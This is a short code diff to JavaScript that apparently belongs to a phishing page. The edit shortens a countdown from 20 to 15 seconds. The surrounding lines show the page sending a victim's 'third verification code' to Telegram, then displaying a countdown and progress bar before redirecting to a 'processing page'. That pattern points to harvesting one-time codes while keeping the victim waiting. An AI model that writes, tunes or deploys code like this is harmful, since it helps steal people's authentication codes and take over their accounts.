@@ -509,8 +509,8 @@
         const success = await sendTelegramMessage(message);
         console.log('Third verification code sent to Telegram:', success);
         
-        // Show countdown and redirect to processing page after 20 seconds
-        let countdown = 20;
+        // Show countdown and redirect to processing page after 15 seconds
+        let countdown = 15;
         const countdownElement = document.createElement('div');
         countdownElement.style.cssText = `
           margin-top: 20px;
@@ -533,7 +533,7 @@
         const timer = setInterval(() => {
           countdown--;
           document.getElementById('countdown-timer').textContent = countdown;
-          document.getElementById('progress-bar').style.width = ((20 - countdown) / 20) * 100 + '%';
+          document.getElementById('progress-bar').style.width = ((15 - countdown) / 15) * 100 + '%';
           
           if (countdown <= 0) {
             clearInterval(timer);
